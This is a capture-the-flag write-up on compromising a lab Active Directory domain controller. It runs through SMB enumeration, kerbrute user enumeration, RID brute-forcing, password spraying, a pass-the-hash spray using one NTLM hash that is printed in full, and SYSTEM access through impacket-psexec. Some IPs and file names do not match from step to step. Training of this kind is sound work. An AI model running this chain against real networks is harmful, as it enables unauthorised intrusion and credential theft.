## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Test your enumeration skills on this boot-to-root machine.
Soupedecode is an intense and engaging challenge in which players must compromise a domain controller by exploiting Kerberos authentication, navigating through SMB shares, performing password spraying, and utilizing Pass-the-Hash techniques. Prepare to test your skills and strategies in this multifaceted cyber security adventure.

Note: Please allow 4 minutes for the VM to properly boot up.
```

## IP-Address
```IP-Address
10.201.85.140
```

## Rustscan
```bash
rustscan -a 10.201.85.140
Open 10.201.85.140:53
Open 10.201.85.140:135
Open 10.201.85.140:139
Open 10.201.85.140:389
Open 10.201.85.140:445
Open 10.201.85.140:464
Open 10.201.85.140:593
Open 10.201.85.140:3268
Open 10.201.85.140:3389
Open 10.201.85.140:88
Open 10.201.85.140:5985
Open 10.201.85.140:9389
Open 10.201.85.140:49664
Open 10.201.85.140:49667
Open 10.201.85.140:49676
Open 10.201.85.140:49713
```

After this its confirm that 
## Analyzes
|Port|Service|Purpose|
|---|---|---|
|88|**Kerberos**|Auth (key to AD attacks) ✅|
|389|**LDAP**|User/Group enumeration ✅|
|445|**SMB**|File shares, access info ✅|
|464|kpasswd|Used for Kerberos password changes|
|593|RPC over HTTP|DCOM/Remote mgmt|
|5985|WinRM|Remote shell (post-exploitation) ✅|
|3268|Global Catalog|AD data queries|
|3389|RDP|Graphical login (if creds are valid)|
|9389|AD Web Services|BloodHound uses this|
|135,139|NetBIOS/DCOM|RPC/Name resolution|
which definately reveals about the machine That Related to AD
then we initiate SMB Client to get info 

```bash
smbclient -L //10.201.85.140 -N
smbclient //10.201.85.140/SYSVOL -N
smbclient //10.201.85.140/NETLOGON -N
smbclient //10.201.85.140/backup -N
ls
smbclient //10.201.85.140/Users -N
```
in all cases access is denied 
so we switch to check or reconnaissance and get more info about the machine
```bash
# crackmapexec smb 10.201.85.140

SMB         10.201.85.140   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
```

## Analyze
| Detail          | Value                             |
| --------------- | --------------------------------- |
| **Hostname**    | `DC01`                            |
| **Domain**      | `SOUPEDECODE.LOCAL` ✅             |
| **OS**          | Windows Server 2022 (Build 20348) |
| **SMB Signing** | `True` (No relay possible)        |
| **SMBv1**       | `False` (secure config)           |
Then WE run kerbrute
```bash
# kerbrute userenum --dc 10.201.85.140 -d SOUPEDECODE.LOCAL user.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/03/25 - Ronnie Flathers @ropnop

2025/08/03 20:36:00 >  Using KDC(s):
2025/08/03 20:36:00 >  	10.201.85.140:88

2025/08/03 20:36:00 >  [+] VALID USERNAME:	 administrator@SOUPEDECODE.LOCAL
2025/08/03 20:36:00 >  [+] VALID USERNAME:	 guest@SOUPEDECODE.LOCAL
2025/08/03 20:36:00 >  Done! Tested 11 usernames (2 valid) in 0.008 seconds
```
which gives us two usefull user mail 
```credentials
administrator@SOUPEDECODE.LOCAL
guest@SOUPEDECODE.LOCAL
charlie@SOUPEDECODE.LOCAL
```

These are the credentials but nothing work in our case and help us to login into the SMB so changed the tactic
Lets Find out all the possible credentials 
```bash
$ nxc smb dc01.soupedecode.local -u 'guest' -p '' --rid-brute 3000 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 > valid_usernames.txt
```
This Will Create all the Valid user list
```bash
$ nxc smb dc01.soupedecode.local -u valid_usernames.txt -p valid_usernames.txt --no-bruteforce --continue-on-success
SMB         10.48.182.40    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SOUPEDECODE.LOCAL\kleo2:kleo2 STATUS_LOGON_FAILURE

SMB         10.48.182.40    445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:[password omitted] 
```

Found the Valid User Credentials 
```Credentials
Username: ybob317
Password: [password omitted]
```

### Check Permissions
```bash
─$ nxc smb 10.48.182.40 -u 'ybob317' -p '[password omitted]' --shares

 SMB         10.48.182.40    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.48.182.40    445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:[password omitted] 
SMB         10.48.182.40    445    DC01             [*] Enumerated shares
SMB         10.48.182.40    445    DC01             Share           Permissions     Remark
SMB         10.48.182.40    445    DC01             -----           -----------     ------
SMB         10.48.182.40    445    DC01             ADMIN$                          Remote Admin
SMB         10.48.182.40    445    DC01             backup                          
SMB         10.48.182.40    445    DC01             C$                              Default share
SMB         10.48.182.40    445    DC01             IPC$            READ            Remote IPC
SMB         10.48.182.40    445    DC01             NETLOGON        READ            Logon server share
SMB         10.48.182.40    445    DC01             SYSVOL          READ            Logon server share
SMB         10.48.182.40    445    DC01             Users           READ           
```

## Access SMB
```bash
$nxc smb 10.201.85.140 -u 'ybob317' -p '[password omitted]' --shares
|      Share      |      Permission      |
|        ---      |          ---         |
|      NETLOGON   |        READ          |
|      SYSVOL     |        READ          |
|      Users      |        READ          |
|      backup     |        READ          |
```

#### Accessing Users data
```bash
$smbclient //10.48.182.40/Users -U "SOUPEDECODE.LOCAL/ybob317"
$smb: \> cd ybob317
$smb: \ybob317\> ls
3D Objects/
Documents/
Downloads/
Desktop/
Pictures/
NTUSER.DAT
$smb: \ybob317\> cd Desktop
$smb: \ybob317\Desktop\> ls
desktop.ini
user.txt
$smb: \ybob317\Desktop\> get user.txt
cat user.txt
[flag/hash omitted] 
```

## User Flag
```Flag
[flag/hash omitted]
```

## Priv Escalation
#### Accessing the backup Share
```bash
$smbclient //10.201.85.140/backup -U "SOUPEDECODE.LOCAL/ybob317"
ls
backup_extract.txt
get backup_extract.txt
```

### Backup File Content
```bash
$cat backup_extract.txt
WebServer$:2119:[lmhash omitted]:[nthash omitted]:::
DatabaseServer$:2120:[lmhash omitted]:[nthash omitted]:::
CitrixServer$:2122:[lmhash omitted]:[nthash omitted]:::
FileServer$:2065:[lmhash omitted]:[nthash omitted]:::
MailServer$:2124:[lmhash omitted]:[nthash omitted]:::
BackupServer$:2125:[lmhash omitted]:[nthash omitted]:::
ApplicationServer$:2126:[lmhash omitted]:[nthash omitted]:::
PrintServer$:2127:[lmhash omitted]:[nthash omitted]:::
ProxyServer$:2128:[lmhash omitted]:[nthash omitted]:::
MonitoringServer$:2129:[lmhash omitted]:[nthash omitted]:::
```

These are **machine account NTLM hashes** (format: RID:LM:NT). Lets Decode it
```bash
$hashcat backup_extract.txt /usr/share/wordlists/rockyou.txt -m 1000 -O
Recovered: 0/8 (0%)
```
Expected — machine account passwords are 120+ characters long → **uncrackable**.

#### Checking Which Hash Works – Pass-the-Hash Spray
```bash
$awk -F':' '{print $1":"$4}' backup_extract.txt > computers.hashes
$nxc smb 10.201.85.140 -u users.txt -H hashes.txt
[+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

Found a valid machine account

#### Enumerate Shares as FileServer$
```bash
nxc smb 10.201.85.140 -u FileServer$ -H e41da7e79a4c76dbd9cf79d1cb325559 --shares
ADMIN$          READ,WRITE
C$              READ,WRITE
NETLOGON        READ,WRITE
SYSVOL          READ,WRITE
```

#### Getting SYSTEM on the Domain Controller (PsExec)
```bash
$impacket-psexec "SOUPEDECODE.LOCAL/FileServer$:@10.201.85.140" -hashes :e41da7e79a4c76dbd9cf79d1cb325559
[*] Uploading file ...
[*] Creating service ...
[*] Starting service ...
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt 
[flag/hash omitted]
```

## Root Flag
```Flag
[flag/hash omitted]
```
